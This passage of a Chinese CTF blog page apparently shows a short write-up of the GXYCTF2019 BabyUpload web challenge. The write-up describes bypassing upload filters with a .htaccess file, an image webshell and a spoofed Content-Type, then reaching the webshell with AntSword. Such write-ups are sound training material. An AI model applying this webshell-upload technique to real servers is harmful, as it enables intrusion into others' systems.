+<h1 id="T6-GXYCTF2019-BabyUpload"><a href="#T6-GXYCTF2019-BabyUpload" class="headerlink" title="T6 [GXYCTF2019]BabyUpload"></a>T6 [GXYCTF2019]BabyUpload</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload" >题目地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>上传后缀不能含有<code>ph</code>，且文件内容过滤<code>&lt;?</code>，利用 <code>script</code> + <code>.hatcess</code>文件 + 图片马 进行绕过</p>
+<p>图片马上传成功，并给出了上传路径”&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;6cdfb1db05f2e76413034fd35b6cd993&#x2F;webshell.jpg”，上传<code>.hatcess</code>文件时被检测出<strong>上传类型</strong>“漏骨”，这里修改一下<code>Content-Type: image/jpeg</code>，也成功上传。</p>
+<p>尝试直接用蚁剑连接，成功找到Flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d03a8dc5-50d1-4555-87af-0bfcede2efc4.node4.buuoj.cn:81/upload/6cdfb1db05f2e76413034fd35b6cd993/webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>做这题本来是看到有个wp写着system被禁用了，想学一点其他技巧，没想到蚁剑直接连上了……这里也补充一下叭:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source() 函数对文件进行语法高亮显示</span><br><span class="line">file_get_contents() 整个文件读入一个字符串中</span><br></pre></td></tr></table></figure>
+
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF/">CTF</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web/">web</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/04/09/2023TimeKeeper-X-HashTeam/"
+                                   title="2023TimeKeeper-X-HashTeam"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">2023TimeKeeper-X-HashTeam</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/01/26/%E7%AE%80%E6%98%93CPU%E7%9A%84Verilog%E5%AE%9E%E7%8E%B0/"
+                                   title="简易CPU的Verilog实现"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">简易CPU的Verilog实现</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script 
+                src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initGitalk = () => {
+            let gitalkPathname = decodeURI(location.pathname)
+            const gitalkPathnameLength = gitalkPathname.length
+            const gitalkPathnameMaxLength = 50
+            if (gitalkPathnameLength > gitalkPathnameMaxLength) {
+              gitalkPathname = gitalkPathname.substring(0, gitalkPathnameMaxLength - 3) + '...'
+            }
+
+            if (window?.Gitalk) {
+              new Gitalk({
+                clientID: 'Ov23liQm7PTQpK5JLa0h',
+                clientSecret: 'ba0525d7d59a301a09ac76ed9299df6ceb9a42a5',
+                repo: 'gitalk',
+                owner: 'ohvy',
+                admin: 'ohvy',
+                id: gitalkPathname,
+                proxy: '',
+                language: 'zh-CN'
+              }).render('gitalk-container')
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initGitalk()
+              }, 1000)
+            }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGitalk()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initGitalk)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#T1-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-text">T1 [ACTF2020 新生赛]Include</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T2-MRCTF2020-Ez-bypass"><span class="nav-text">T2 [MRCTF2020]Ez_bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload-1"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T3-SUCTF-2019-CheckIn"><span class="nav-text">T3 [SUCTF 2019]CheckIn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8Euser-ini%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="nav-text">一些关于user.ini的知识</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T4-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-text">T4 [护网杯 2018]easy_tornado</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96cookie-secret"><span class="nav-text">获取cookie_secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97md5"><span class="nav-text">计算md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload-2"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T5-GYCTF2020-Blacklist"><span class="nav-text">T5 [GYCTF2020]Blacklist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload-3"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T6-GXYCTF2019-BabyUpload"><span class="nav-text">T6 [GXYCTF2019]BabyUpload</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Latte</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#T1-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-text">T1 [ACTF2020 新生赛]Include</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T2-MRCTF2020-Ez-bypass"><span class="nav-text">T2 [MRCTF2020]Ez_bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload-1"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T3-SUCTF-2019-CheckIn"><span class="nav-text">T3 [SUCTF 2019]CheckIn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8Euser-ini%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="nav-text">一些关于user.ini的知识</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T4-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-text">T4 [护网杯 2018]easy_tornado</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96cookie-secret"><span class="nav-text">获取cookie_secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97md5"><span class="nav-text">计算md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload-2"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T5-GYCTF2020-Blacklist"><span class="nav-text">T5 [GYCTF2020]Blacklist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload-3"><span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T6-GXYCTF2019-BabyUpload"><span class="nav-text">T6 [GXYCTF2019]BabyUpload</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/lazyload.min.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
